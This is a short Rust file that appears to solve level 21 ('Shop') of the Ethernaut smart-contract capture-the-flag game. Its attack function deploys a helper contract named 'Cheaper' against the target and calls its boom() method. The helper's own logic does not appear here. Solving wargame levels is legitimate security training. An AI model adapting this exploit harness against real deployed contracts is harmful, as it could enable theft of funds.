use crate::abi::cheaper::Cheaper;
use async_trait::async_trait;
use ctf::ethernaut::lvl21_shop::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let hack_contract =
            Cheaper::deploy(offender.to_owned(), target.address)?
                .send()
                .await?;
        hack_contract.boom().send().await?;
        Ok(())
    }
}
